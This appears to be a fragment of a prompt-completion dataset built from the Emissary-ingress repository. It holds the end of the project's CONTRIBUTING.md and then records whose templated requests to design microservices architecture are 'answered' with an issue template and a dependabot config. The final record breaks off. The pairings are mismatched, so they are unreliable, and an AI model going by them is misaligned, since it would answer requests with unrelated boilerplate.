issue](https://github.com/emissary-ingress/emissary/issues) or create a [new issue](https://github.com/emissary-ingress/emissary/issues/new/choose).\n\n2. Be sure to describe your proposed change and any open questions you might have in the issue. This allows us to collect historical context around an issue, provide feedback on the proposed solution and discuss what versions a fix should target.\n\n3. If you haven't done so already create a fork of the respository and clone it locally\n\n   ```shell\n   git clone <your-fork>\n   ```\n\n4. Cut a new patch branch from `master`:\n\n   ```shell\n   git checkout master\n   git checkout -b my-patch-branch master\n   ```\n\n5. Make necessary code changes.\n\n   - Make sure you include test coverage for the change, see [How do I run Tests](#how-do-i-run-emissary-ingress-tests)\n   - Ensure code linting is passing by running `make lint`\n   - Code changes must have associated documentation updates.\n      - Make changes in <https://github.com/datawire/ambassador-docs> as necessary, and include a reference to those changes the pull request for your code changes.\n      - See [Contributing to Docs](#contributing-to-the-docs) for more details.\n\n   > Smaller pull requests are easier to review and can get merged faster thus reducing potential for merge conflicts so it is recommend to keep them small and focused.\n\n6. Commit your changes using descriptive commit messages.\n   - we **require** that all commits are signed off so please be sure to commit using the `--signoff` flag, e.g. `git commit --signoff`\n   - commit message should summarize the fix and motivation for the proposed fix. Include issue # that the fix looks to address.\n   - we are \"ok\" with multiple commits but we may ask you to squash some commits during the PR review process\n\n7. Push your branch to your forked repository:\n\n   > It is good practice to make sure your change is rebased on the latest master to ensure it will merge cleanly so if it has been awhile since you rebased on upstream you should do it now to ensure there are no merge conflicts\n\n   ```shell\n   git push origin my-patch-branch\n   ```\n\n8. Submit a Pull Request from your fork targeting upstream `emissary/master`.\n\nThanks for your contribution! One of the [Maintainers](../Community/MAINTAINERS.md) will review your PR and discuss any changes that need to be made.\n\n### Pull Request Review Process\n\nThis is an opportunity for the Maintainers to review the code for accuracy and ensure that it solves the problem outlined in the issue. This is an iterative process and meant to ensure the quality of the code base. During this process we may ask you to break up Pull Request into smaller changes, squash commits, rebase on master, etc...\n\nOnce you have been provided feedback:\n\n1. Make the required updates to the code per the review discussion\n2. Retest the code and ensure linting is still passing\n3. Commit the changes and push to Github\n   - see [Fixup Commits](#fixup-commits-during-pr-review) below\n4. Repeat these steps as necessary\n\nOnce you have **two approvals** then one of the Maintainers will merge the PR.\n\n:tada: Thank you for contributing and being apart of the Emissary-ingress Community!\n\n### Rebasing a branch under review\n\nMany times the base branch will have new commits added to it which may cause merge conflicts with your open pull request. First, a good rule of thumb is to make pull request small so that these conflicts are less likely to occur but this is not always possible when have multiple people working on similiar features. Second, if it is just addressing commit feedback a `fixup` commit is also a good option so that the reviewers can see what changed since their last review.\n\nIf you need to address merge conflicts then it is preferred that you use **Rebase** on the base branch rather than merging base branch into the feature branch. This ensures that when the PR is merged that it will cleanly replay on top of the base branch ensuring we maintain a clean linear history.\n\nTo do a rebase you can do the following:\n\n```shell\n# add emissary.git as a remote repository, only needs to be done once\ngit remote add upstream https://github.com/emissary-ingress/emissary.git\n\n# fetch upstream master\ngit fetch upstream master\n\n# checkout local master and update it from upstream master\ngit checkout master\ngit pull -ff upstream master\n\n# rebase patch branch on local master\ngit checkout my-patch-branch\ngit rebase -i master\n```\n\nOnce the merge conflicts are addressed and you are ready to push the code up you will need to force push your changes because during the rebase process the commit sha's are re-written and it has diverged from what is in your remote fork (Github).\n\nTo force push a branch you can:\n\n```shell\ngit push head --force-with-lease\n```\n\n> Note: the `--force-with-lease` is recommended over `--force` because it is safer because it will check if the remote branch had new commits added during your rebase. You can read more detail here: <https://itnext.io/git-force-vs-force-with-lease-9d0e753e8c41>\n\n### Fixup commits during PR review\n\nOne of the major downsides to rebasing a branch is that it requires force pushing over the remote (Github) which then marks all the existing review history outdated. This makes it hard for a reviewer to figure out whether or not the new changes addressed the feedback.\n\nOne way you can help the reviewer out is by using **fixup** commits. Fixup commits are special git commits that append `fixup!` to the subject of a commit. `Git` provides tools for easily creating these and also squashing them after the PR review process is done.\n\nSince this is a new commit on top of the other commits, you will not lose your previous review and the new commit can be reviewed independently to determine if the new changes addressed the feedback correctly. Then once the reviewers are happy we will ask you to squash them so that we when it is merged we will maintain a clean linear history.\n\nHere is a quick read on it: <https://jordanelver.co.uk/blog/2020/06/04/fixing-commits-with-git-commit-fixup-and-git-rebase-autosquash/>\n\nTL;DR;\n\n```shell\n# make code change and create new commit\ngit commit --fixup <sha>\n\n# push to Github for review\ngit push\n\n# reviewers are happy and ask you to do a final rebase before merging\ngit rebase -i --autosquash master\n\n# final push before merging\ngit push --force-with-lease\n```\n\n## Development Workflow\n\nThis section introduces the development workflow used for this repository. It is recommended that both Contributors, Release Engineers and Maintainers familiarize themselves with this content.\n\n### Branching Strategy\n\nThis repository follows a trunk based development workflow. Depending on what article you read there are slight nuances to this so this section will outline how this repository interprets that workflow.\n\nThe most important branch is `master` this is our **Next Release** version and it should always be in a shippable state. This means that CI should be green and at any point we can decided to ship a new release from it. In a traditional trunk based development workflow, developers are encouraged to land partially finished work daily and to keep that work hidden behind feature flags. This repository does **NOT** follow that and instead if code lands on master it is something we are comfortable with shipping.\n\nWe ship release candidate (RC) builds from the `master` branch (current major) and also from `release/v{major.minor}` branches (last major version) during our development cycles. Therefore, it is important that it remains shippable at all times!\n\nWhen we do a final release then we will cut a new `release/v{major.minor}` branch. These are long lived release branches which capture a snapshot in time for that release. For example here are some of the current release branches (as of writing this):\n\n- release/v3.2\n- release/v3.1\n- release/v3.0\n- release/v2.4\n- release/v2.3\n- release/v1.14\n\nThese branches contain the codebase as it was at that time when the release was done. These branches have branch protection enabled to ensure that they are not removed or accidently overwritten. If we needed to do a security fix or bug patch then we may cut a new `.Z` patch release from an existing release branch. For example, the `release/v2.4` branch is currently on `2.4.1`.\n\nAs you can see we currently support mutliple major versions of Emissary-ingress and you can read more about our [End-of-Life Policy](https://www.getambassador.io/docs/emissary/latest/about/aes-emissary-eol/).\n\nFor more information on our current RC and Release process you can find that in our [Release Wiki](https://github.com/emissary-ingress/emissary/wiki).\n\n### Backport Strategy\n\nSince we follow a trunk based development workflow this means that the majority of the time your patch branch will be based off from `master` and that most Pull Request will target `master`.\n\nThis ensures that we do not miss bug fixes or features for the \"Next\" shippable release and simplifies the mental-model for deciding how to get started contributing code.\n\n#### What if I need a patch to land in a previous supported version?\n\nLet's say I have a bug fix for CRD round trip conversion for AuthService, which is affecting both `v2.y` and `v3.y`.\n\nFirst within the issue we should discuss what versions we want to target. This can depend on current cycle work and any upcoming releases we may have.\n\nThe general rules we follow are:\n\n1. land patch in \"next\" version which is `master`\n2. backport patch to any `release/v{major}.{minor}` branches\n\nSo, let's say we discuss it and say that the \"next\" major version is a long ways away so we want to do a z patch release on our current minor version(`v3.2`) and we also want to do a z patch release on our last supported major version (`v2.4`).\n\nThis means that these patches need to land in three separate branches:\n\n1. `master` - next release\n2. `release/v3.2` - patch release\n3. `release/v2.4` - patch release\n\nIn this scenario, we first ask you to land the patch in the `master` branch and then provide separate PR's with the commits backported onto the `release/v*` branches.\n\n> Recommendation: using the `git cherry-pick -x` will add the source commit sha to the commit message. This helps with tracing work back to the original commit.\n\n#### What if my patch is only for a previous supported version?\n\nAlthough, this should be an edge case, it does happen where the code has diverged enough that a fix may only be relevant to an existing supported version. In these cases we may need to do a patch release for that older supported version.\n\nA good example, if we were to find a bug in the Envoy v2 protocol configuration we would only want to target the v2 release.\n\nIn this scenario, the base branch that we would create our feature branch off from would be the latest `minor` version for that release. As of writing this, that would be the `release/v2.4` branch. We would **not** need to target master.\n\nBut, let's say during our fix we notice other things that need to be addressed that would also need to be fixed in `master`. Then you need to submit a **separate Pull Request** that should first land on master and then follow the normal backporting process for the other patches.\n\n#### What if I'm still not sure?\n\nThis is what the issue discussions and disucssion in Slack are for so that we can help guide you so feel free to ping us in the `#emissary-dev` channel on Slack to discuss directly with us.\n\n### Merge Strategy\n\n> The audience for this section is the Maintainers but also beneficial for Contributors so that they are familiar with how the project operates.\n\nHaving a clean linear commit history for a repository makes it easier to understand what is being changed and reduces the mental load for new comers to the project.\n\nTo maintain a clean linear commit history the following rules should be followed:\n\nFirst, always rebase patch branch on to base branch. This means **NO** merge commits from merging base branch into the patch branch. This can be accomplished using git rebase.\n\n```shell\n# first, make sure you pull latest upstream changes\ngit fetch upstream\ngit checkout master\ngit pull -ff upstream/master\n\n# checkout patch branch and rebase interactive\n# you may have merge conflicts you need to resolve\ngit checkout my-patch-branch\ngit rebase -i master\n```\n\n> Note: this does rewrite your commit shas so be aware when sharing branches with co-workers.\n\nOnce the Pull Request is reviewed and has **two approvals** then a Maintainer can merge. Maintainers should follow prefer the following merge strategies:\n\n1. rebase and merge\n2. squash merge\n\nWhen `rebase and merge` is used your commits are played on top of the base branch so that it creates a clean linear history. This will maintain all the commits from the Pull Request. In most cases this should be the **preferred** merge strategy.\n\nWhen a Pull Request has lots of fixup commits, or pr feedback fixes then you should ask the Contributor to squash them as part of the PR process.\n\nIf the contributor is unable to squash them then using a `squash merge` in some cases makes sense. **IMPORTANT**, when this does happen it is important that the commit messages are cleaned up and not just blindly accepted the way proposed by Github. Since it is easy to miss that cleanup step, this should be used less frequently compared to `rebase and merge`.\n\n#### What about merge commit strategy?\n\n> The audience for this section is the Maintainers but also beneficial for Contributors so that they are familiar with how the project operates.\n\nWhen maintaining a linear commit history, each commit tells the story of what was changed in the repository. When using `merge commits` it\nadds an additional commit to the history that is not necessary because the commit history and PR history already tell the story.\n\nNow `merge commits` can be useful when you are concerned with not rewriting the commit sha. Based on the current release process which includes using `rel/v` branches that are tagged and merged into `release/v` branches we must use a `merge commit` when merging these branches. This ensures that the commit sha a Git Tag is pointing at still exists once merged into the `release/v` branch.\n\n## Contributing to the Docs\n\nThe Emissary-ingress community will all benefit from having documentation that is useful and correct. If you have found an issue with the end user documentation, then please help us out by submitting an issue and/or pull request with a fix!\n\nThe end user documentation for Emissary-ingress lives in a different repository and can be found at <https://github.com/datawire/ambassador-docs>.\n\nSee this repository for details on how to contribute to either a `pre-release` or already-released version of Emissary-ingress.\n\n## Advanced Topics\n\nThis section is for more advanced topics that provide more detailed instructions. Make sure you go through the Development Setup and read the Architecture document before exploring these topics.\n\n### Running Emissary-ingress internals locally\n\nThe main entrypoint is written in go. It strives to be as compatible as possible\nwith the normal go toolchain. You can run it with:\n\n```bash\ngo run ./cmd/busyambassador entrypoint\n```\n\nOf course just because you can run it this way does not mean it will succeed.\nThe entrypoint needs to launch `diagd` and `envoy` in order to function, and it\nalso expect to be able to write to the `/ambassador` directory.\n\n#### Setting up diagd\n\nIf you want to hack on diagd, its easiest to setup a virtualenv with an editable\ncopy and launch your `go run` from within that virtualenv. Note that these\ninstructions depend on the virtualenvwrapper\n(<https://virtualenvwrapper.readthedocs.io/en/latest/>) package:\n\n```bash\n# Create a virtualenv named venv with all the python requirements\n# installed.\npython3 -m venv venv\n. venv/bin/activate\n# If you're doing this in Datawire's apro.git, then:\ncd ambassador\n# Update pip and install dependencies\npip install --upgrade pip\npip install orjson    # see below\npip install -r builder/requirements.txt\n# Created an editable installation of ambassador:\npip install -e python/\n# Check that we do indeed have diagd in our path.\nwhich diagd\n# If you're doing this in Datawire's apro.git, then:\ncd ..\n```\n\n(Note: it shouldn't be necessary to install `orjson` by hand. The fact that it is\nat the moment is an artifact of the way Ambassador builds currently happen.)\n\n#### Changing the ambassador root\n\nYou should now be able to launch ambassador if you set the\n`ambassador_root` environment variable to a writable location:\n\n   ambassador_root=/tmp go run ./cmd/busyambassador entrypoint\n\n#### Getting envoy\n\nIf you do not have envoy in your path already, the entrypoint will use\ndocker to run it.\n\n#### Shutting up the pod labels error\n\nAn astute observe of the logs will notice that ambassador complains\nvociferously that pod labels are not mounted in the ambassador\ncontainer. To reduce this noise, you can:\n\n```bash\nmkdir /tmp/ambassador-pod-info && touch /tmp/ambassador-pod-info/labels\n```\n\n#### Extra credit\n\nWhen you run ambassador locally it will configure itself exactly as it\nwould in the cluster. That means with two caveats you can actually\ninteract with it and it will function normally:\n\n1. You need to run `telepresence connect` or equivalent so it can\n   connect to the backend services in its configuration.\n\n2. You need to supply the host header when you talk to it.\n\n### Debugging and Developing Envoy Configuration\n\nEnvoy configuration is generated by the ambassador compiler. Debugging\nthe ambassador compiler by running it in kubernetes is very slow since\nwe need to push both the code and any relevant kubernetes resources\ninto the cluster. The following sections will provide tips for improving\nthis development experience.\n\n### Making changes to Envoy\n\nEmissary-ingress is built on top of Envoy and leverages a vendored version of Envoy (*we track upstream very closely*). This section will go into how to make changes to the Envoy that is packaged with Emissary-ingress.\n\nThis is a bit more complex than anyone likes, but here goes:\n\n#### 1. Preparing your machine\n\nBuilding and testing Envoy can be very resource intensive.  A laptop\noften can build Envoy... if you plug in an external hard drive, point\na fan at it, and leave it running overnight and most of the next day.\nAt Ambassador Labs, we'll often spin up a temporary build machine in GCE, so\nthat we can build it very quickly.\n\nAs of Envoy 1.15.0, we've measure the resource use to build and test\nit as:\n\n> | Command            | Disk Size | Disk Used | Duration[1] |\n> |--------------------|-----------|-----------|-------------|\n> | `make update-base` | 450G      |  12GB     | ~11m        |\n> | `make check-envoy` | 450G      | 424GB     | ~45m        |\n>\n> [1] On a \"Machine type: custom (32 vCPUs, 512 GB memory)\" VM on GCE,\n> with the following entry in its `/etc/fstab`:\n>\n> ```bash\n> tmpfs:docker  /var/lib/docker  tmpfs  size=450G  0  0\n> ```\n\nIf you have the RAM, we've seen huge speed gains from doing the builds\nand tests on a RAM disk (see the `/etc/fstab` line above).\n\n#### 2. Setting up your workspace to hack on Envoy\n\n1. From your `emissary.git` checkout, get Emissary-ingress's current\n   version of the Envoy sources, and create a branch from that:\n\n   ```shell\n   make $PWD/_cxx/envoy\n   git -C _cxx/envoy checkout -b YOUR_BRANCHNAME\n   ```\n2. To build Envoy in FIPS mode, set the following variable:\n\n   ```shell\n   export FIPS_MODE=true\n   ```\n\n   It is important to note that while building Envoy in FIPS mode is\n   required for FIPS compliance, additional steps may be necessary.\n   Emissary does not claim to be FIPS compliant or certified.\n   See [here](https://www.envoyproxy.io/docs/envoy/latest/intro/arch_overview/security/ssl#fips-140-2) for more information on FIPS and Envoy.\n\n> _NOTE:_ FIPS_MODE is NOT supported by the emissary-ingress maintainers but we provide this for developers as convience\n\n#### 3. Hacking on Envoy\n\nModify the sources in `./_cxx/envoy/`. or update the branch and/or `ENVOY_COMMIT` as necessary in `./_cxx/envoy.mk`\n\n#### 4. Building and testing your hacked-up Envoy\n\n> See `./_cxx/envoy.mk` for the full list of targets.\n\nMultiple Phony targets are provided so that developers can run the steps they are interested in when developing, here are few of the key ones:\n\n- `make update-base`: will perform all the steps necessary to verify, build envoy, build docker images, push images to the container repository and compile the updated protos.\n\n- `make build-envoy`: will build the envoy binaries using the same build container as the upstream Envoy project. Build outputs are mounted to the  `_cxx/envoy-docker-build` directory and Bazel will write the results there.\n\n- `make build-base-envoy-image`: will use the release outputs from building envoy to generate a new `base-envoy` container which is then used in the main emissary-ingress container build.\n\n- `make push-base-envoy`: will push the built container to the remote container repository.\n\n- `make check-envoy`: will use the build docker container to run the Envoy test suite against the currently checked out envoy in the `_cxx/envoy` folder.\n\n- `make envoy-shell`: will run the envoy build container and open a bash shell session. The `_cxx/envoy` folder is volume mounted into the container and the user is set to the `envoybuild` user in the container to ensure you are not running as root to ensure hermetic builds.\n\n#### 5. Test Devloop\n\nRunning the Envoy test suite will compile all the test targets. This is a slow process and can use lots of disk space.\n\nThe Envoy Inner Devloop for build and testing:\n\n- You can make a change to Envoy code and run the whole test by just calling `make check-envoy`\n- You can run a specific test instead of the whole test suite by setting the `ENVOY_TEST_LABEL` environment variable.\n  - For example, to run just the unit tests in `test/common/network/listener_impl_test.cc`, you should run:\n\n   ```shell\n   ENVOY_TEST_LABEL='//test/common/network:listener_impl_test' make check-envoy\n   ```\n\n- Alternatively, you can run `make envoy-shell` to get a bash shell into the Docker container that does the Envoy builds and you are free to interact with `Bazel` directly.\n\nInterpreting the test results:\n\n- If you see the following message, don't worry, it's harmless; the tests still ran:\n\n   ```text\n   There were tests whose specified size is too big. Use the --test_verbose_timeout_warnings command line option to see which ones these are.\n   ```\n\n   The message means that the test passed, but it passed too\n   quickly, and Bazel is suggesting that you declare it as smaller.\n   Something along the lines of \"This test only took 2s, but you\n   declared it as being in the 60s-300s ('moderate') bucket,\n   consider declaring it as being in the 0s-60s ('short')\n   bucket\".\n\n   Don't be confused (as I was) in to thinking that it was saying\n   that the test was too big and was skipped and that you need to\n   throw more hardware at it.\n\n- **Build or test Emissary-ingress** with the usual `make` commands, with\n  the exception that you MUST run `make update-base` first whenever\n  Envoy needs to be recompiled; it won't happen automatically.  So\n  `make test` to build-and-test Emissary-ingress would become\n  `make update-base && make test`, and `make images` to just build\n  Emissary-ingress would become `make update-base && make images`.\n\nThe Envoy changes with Emissary-ingress:\n\n- Either run `make update-base` to build, and push a new base container and then you can run `make test` for the Emissary-ingress test suite.\n- If you do not want to push the container you can instead:\n  - Build Envoy - `make build-envoy`\n  - Build container - `make build-base-envoy-image`\n  - Test Emissary - `make test`\n\n#### 6. Protobuf changes\n\nIf you made any changes to the Protocol Buffer files or if you bumped versions of Envoy then you\nshould make sure that you are re-compiling the Protobufs so that they are available and checked-in\nto the emissary.git repository.\n\n```sh\nmake compile-envoy-protos\n```\n\nThis will copy over the raw proto files, compile and copy the generated go code over to emisary-ignress repository.\n\n#### 7. Finalizing your changes\n\n> NOTE: we are no longer accepting PR's in `datawire/envoy.git`.\n\nIf you have custom changes then land them in your custom envoy repository and update the `ENVOY_COMMIT` and `ENVOY_DOCKER_REPO` variable in `_cxx/envoy.mk` so that the image will be pushed to the correct repository.\n\nThen run `make update-base` does all the bits so assuming that was successful then are all good.\n\n**For maintainers:**\n\nYou will want to make sure that the image is pushed to the backup container registries:\n\n```shell\n# upload image to the mirror in GCR\nSHA=GET_THIS_FROM_THE_make_update-base_OUTPUT\nTAG=\"envoy-0.$SHA.opt\"\ndocker pull \"docker.io/emissaryingress/base-envoy:envoy-0.$TAG.opt\"\ndocker tag \"docker.io/emissaryingress/base-envoy:$TAG\" \"gcr.io/datawire/ambassador-base:$TAG\"\ndocker push \"gcr.io/datawire/ambassador-base:$TAG\"\n```\n\n#### 8. Final Checklist\n\n**For Maintainers Only**\n\nHere is a checklist of things to do when bumping the `base-envoy` version:\n\n- [ ] The image has been pushed to...\n  - [ ] `docker.io/emissaryingress/base-envoy`\n  - [ ] `gcr.io/datawire/ambassador-base`\n- [ ] The `datawire/envoy.git` commit has been tagged as `datawire-$(git describe --tags --match='v*')`\n      (the `--match` is to prevent `datawire-*` tags from stacking on each other).\n- [ ] It's been tested with...\n  - [ ] `make check-envoy`\n\nThe `check-envoy-version` CI job will double check all these things, with the exception of running\nthe Envoy tests. If the `check-envoy-version` is failing then double check the above, fix them and\nre-run the job.\n\n### Developing Emissary-ingress (Maintainers-only advice)\n\nAt the moment, these techniques will only work internally to Maintainers. Mostly\nthis is because they require credentials to access internal resources at the\nmoment, though in several cases we're working to fix that.\n\n#### Updating license documentation\n\nWhen new dependencies are added or existing ones are updated, run\n`make generate` and commit changes to `DEPENDENCIES.md` and\n`DEPENDENCY_LICENSES.md`\n\n#### Upgrading Python dependencies\n\nDelete `python/requirements.txt`, then run `make generate`.\n\nIf there are some dependencies you don't want to upgrade, but want to\nupgrade everything else, then\n\n 1. Remove from `python/requirements.txt` all of the entries except\n    for those you want to pin.\n 2. Delete `python/requirements.in` (if it exists).\n 3. Run `make generate`.\n\n> **Note**: If you are updating orjson you will need to also update `docker/base-python/Dockerfile` before running `make generate` for the new version. orjson uses rust bindings and the default wheels on PyPI rely on glibc. Because our base python image is Alpine based, it is built from scratch using rustc to build a musl compatable version.\n\n > :warning: You may run into an error when running `make generate` where it can't detect the licenses for new or upgraded dependencies, which is needed so that so that we can properly generate DEPENDENCIES.md and DEPENDENCY_LICENSES.md. If that is the case, you may also have to update `build-aux/tools/src/py-mkopensource/main.go:parseLicenses` for any license changes then run `make generate` again.\n\n## FAQ\n\nThis section contains a set of Frequently Asked Questions that may answer a question you have. Also, feel free to ping us in Slack.\n\n### How do I find out what build targets are available?\n\nUse `make help` and `make targets` to see what build targets are\navailable along with documentation for what each target does.\n\n### How do I develop on a Mac with Apple Silicon?\n\nTo ensure that developers using a Mac with Apple Silicon can contribute, the build system ensures\nthe build artifacts are `linux/amd64` rather than the host architecture. This behavior can be overriden\nusing the `BUILD_ARCH` environment variable (e.g. `BUILD_ARCH=linux/arm64 make images`).\n\n### How do I develop on Windows using WSL?\n\n- [WSL 2](https://learn.microsoft.com/en-us/windows/wsl/)\n- [Docker Desktop for Windows](https://docs.docker.com/desktop/windows/wsl/)\n- [VS Code](https://code.visualstudio.com/)\n\n### How do I test using a private Docker repository?\n\nIf you are pushing your development images to a private Docker repo,\nthen:\n\n```sh\nexport DEV_USE_IMAGEPULLSECRET=true\nexport DOCKER_BUILD_USERNAME=...\nexport DOCKER_BUILD_PASSWORD=...\n```\n\nand the test machinery should create an `imagePullSecret` from those Docker credentials such that it can pull the images.\n\n### How do I change the loglevel at runtime?\n\n```console\ncurl localhost:8877/ambassador/v0/diag/?loglevel=debug\n```\n\nNote: This affects diagd and Envoy, but NOT the AES `amb-sidecar`.\nSee the AES `CONTRIBUTING.md` for how to do that.\n\n### Can I build from a docker container instead of on my local computer?\n\nIf you want to build within a container instead of setting up dependencies on your local machine then you can run the build within a docker container and leverage \"Docker in Docker\" to build it.\n\n1. `docker pull docker:latest`\n2. `docker run --rm -v /var/run/docker.sock:/var/run/docker.sock -it docker:latest sh`\n3. `apk add --update --no-cache bash build-base go curl rsync python3 python2 git libarchive-tools gawk jq`\n4. `git clone https://github.com/emissary-ingress/emissary.git && cd emissary`\n5. `make images`\n\nSteps 0 and 1 are run on your machine, and 2 - 4 are from within the docker container. The base image is a \"Docker in Docker\" image, ran with `-v /var/run/docker.sock:/var/run/docker.sock` in order to connect to your local daemon from the docker inside the container. More info on Docker in Docker [here](https://hub.docker.com/_/docker).\n\nThe images will be created and tagged as defined above, and will be available in docker on your local machine.\n\n### How do I clear everything out to make sure my build runs like it will in CI?\n\nUse `make clobber` to completely remove all derived objects, all cached artifacts, everything, and get back to a clean slate. This is recommended if you change branches within a clone, or if you need to `make generate` when you're not *certain* that your last `make generate` was using the same Envoy version.\n\nUse `make clean` to remove derived objects, but *not* clear the caches.\n\n### My editor is changing `go.mod` or `go.sum`, should I commit that?\n\nIf you notice this happening, run `make go-mod-tidy`, and commit that.\n\n(If you're in Ambassador Labs, you should do this from `apro/`, not\n`apro/ambassador/`, so that apro.git's files are included too.)\n\n### How do I debug \"This should not happen in CI\" errors?\n\nThese checks indicate that some output file changed in the middle of a\nrun, when it should only change if a source file has changed.  Since\nCI isn't editing the source files, this shouldn't happen in CI!\n\nThis is problematic because it means that running the build multiple\ntimes can give different results, and that the tests are probably not\ntesting the same image that would be released.\n\nThese checks will show you a patch showing how the output file\nchanged; it is up to you to figure out what is happening in the\nbuild/test system that would cause that change in the middle of a run.\nFor the most part, this is pretty simple... except when the output\nfile is a Docker image; you just see that one image hash is different\nthan another image hash.\n\nFortunately, the failure showing the changed image hash is usually\nimmediately preceded by a `docker build`.  Earlier in the CI output,\nyou should find an identical `docker build` command from the first time it\nran.  In the second `docker build`'s output, each step should say\n`---> Using cache`; the first few steps will say this, but at some\npoint later steps will stop saying this; find the first step that is\nmissing the `---> Using cache` line, and try to figure out what could\nhave changed between the two runs that would cause it to not use the\ncache.\n\nIf that step is an `ADD` command that is adding a directory, the\nproblem is probably that you need to add something to `.dockerignore`.\nTo help figure out what you need to add, try adding a `RUN find\nDIRECTORY -exec ls -ld -- {} +` step after the `ADD` step, so that you\ncan see what it added, and see what is different on that between the\nfirst and second `docker build` commands.\n\n### How do I run Emissary-ingress tests?\n\n- `export DEV_REGISTRY=<your-dev-docker-registry>` (you need to be logged in and have permission to push)\n- `export DEV_KUBECONFIG=<your-dev-kubeconfig>`\n\nIf you want to run the Go tests for `cmd/entrypoint`, you'll need `diagd`\nin your `PATH`. See the instructions below about `Setting up diagd` to do\nthat.\n\n| Group           | Command                                                                |\n| --------------- | ---------------------------------------------------------------------- |\n| All Tests       | `make test`                                                            |\n| All Golang      | `make gotest`                                                          |\n| All Python      | `make pytest`                                                          |\n| Some/One Golang | `make gotest GOTEST_PKGS=./cmd/entrypoint GOTEST_ARGS=\"-run TestName\"` |\n| Some/One Python | `make pytest PYTEST_ARGS=\"-k TestName\"`                                |\n\nPlease note the python tests use a local cache to speed up test\nresults. If you make a code update that changes the generated envoy\nconfiguration, those tests will fail and you will need to update the\npython test cache.\n\nNote that it is invalid to run one of the `main[Plain.*]` Python tests\nwithout running all of the other `main[Plain*]` tests; the test will\nfail to run (not even showing up as a failure or xfail--it will fail\nto run at all).  For example, `PYTEST_ARGS=\"-k WebSocket\"` would match\nthe `main[Plain.WebSocketMapping-GRPC]` test, and that test would fail\nto run; one should instead say `PYTEST_ARGS=\"-k Plain or WebSocket\"`\nto avoid breaking the sub-tests of \"Plain\".\n\n### How do I type check my python code?\n\nAmbassador uses Python 3 type hinting and the `mypy` static type checker to\nhelp find bugs before runtime. If you haven't worked with hinting before, a\ngood place to start is\n[the `mypy` cheat sheet](https://mypy.readthedocs.io/en/latest/cheat_sheet_py3.html).\n\nNew code must be hinted, and the build process will verify that the type\ncheck passes when you `make test`. Fair warning: this means that\nPRs will not pass CI if the type checker fails.\n\nWe strongly recommend using an editor that can do realtime type checking\n(at Datawire we tend to use PyCharm and VSCode a lot, but many many editors\ncan do this now) and also running the type checker by hand before submitting\nanything:\n\n- `make lint/mypy` will check all the Ambassador code\n\nAmbassador code should produce *no* warnings and *no* errors.\n\nIf you're concerned that the mypy cache is somehow wrong, delete the\n`.mypy_cache/` directory to clear the cache.\n\n", "metadata": {"source": "github.com/emissary-ingress/emissary", "file_path": ".github/CONTRIBUTING.md", "language": "markdown", "complexity": "complex", "star_count": 4436, "quality_score": 0.69, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 930}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nname: Feature request\nabout: Suggest an idea for this project\n\n---\n\n**Please describe your use case / problem.**\nA clear and concise description of your use case / problem. The \"why\" is really valuable to us. For example, \"I have a set of services whose clients have long-lived connections.\"\n\n**Describe the solution you'd like**\nA clear and concise description of what you want to happen.\n\n**Describe alternatives you've considered**\nA clear and concise description of any alternative solutions or features you've considered.\n\n**Additional context**\nAdd any other context about the feature request here.\n", "metadata": {"source": "github.com/emissary-ingress/emissary", "file_path": ".github/ISSUE_TEMPLATE/Feature_request.md", "language": "markdown", "complexity": "simple", "star_count": 4436, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 18}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "version: 2\nupdates:\n  - package-ecosystem: gomod\n    directory: \"/\"\n    schedule:\n      interval: daily\n    open-pull-requests-limit: 10\n    ignore:\n      - dependency-name: \"sigs.k8s.io/gateway-api\"\n      - dependency-name: \"go.opentelemetry.io/proto/otlp\"\n\n  - package-ecosystem: gomod\n    directory: \"/tools/src/yq\"\n    schedule:\n      interval: daily\n    open-pull-requests-limit: 10\n\n  - package-ecosystem: gomod\n    directory: \"/tools/src/chart-doc-gen\"\n    schedule:\n      interval: daily\n    open-pull-requests-limit: 10\n\n  - package-ecosystem: gomod\n    directory: \"/tools/src/crane\"\n    schedule:\n      interval: daily\n    open-pull-requests-limit: 10\n\n  - package-ecosystem: gomod\n    directory: \"/tools/src/ct\"\n    schedule:\n      interval: daily\n    open-pull-requests-limit: 10\n\n  - package-ecosystem: gomod\n    directory: \"/tools/src/golangci-lint\"\n    schedule:\n      interval: daily\n    open-pull-requests-limit: 10\n\n  - package-ecosystem: gomod\n    directory: \"/tools/src/ocibuild\"\n    schedule:\n      interval: daily\n    open-pull-requests-limit: 10\n\n  - package-ecosystem: pip\n    directory: \"/docker/test-auth\"\n    schedule:\n      interval: daily\n    open-pull-requests-limit: 10\n\n  - package-ecosystem: pip\n    directory: \"/docker/test-shadow\"\n    schedule:\n      interval: daily\n    open-pull-requests-limit: 10\n\n  - package-ecosystem: pip\n    directory: \"/docker/test-stats\"\n    schedule:\n      interval: daily\n    open-pull-requests-limit: 10\n\n  - package-ecosystem: pip\n    directory: \"/python\"\n    schedule:\n      interval: daily\n    open-pull-requests-limit: 10\n    ignore:\n      - dependency-name: pytest\n      - dependency-name: urllib3\n        versions:\n          - \"<2.0\"\n  - package-ecosystem: docker\n    directory: \"/docker/base-python\"\n    schedule:\n      interval: daily\n    open-pull-requests-limit: 10\n\n  - package-ecosystem: docker\n    directory: \"/docker/test-auth\"\n    schedule:\n      interval: daily\n    open-pull-requests-limit: 10\n\n  - package-ecosystem: docker\n    directory: \"/docker/test-http\"\n    schedule:\n      interval: daily\n    open-pull-requests-limit: 10\n\n  - package-ecosystem: docker\n    directory: \"/docker/test-shadow\"\n    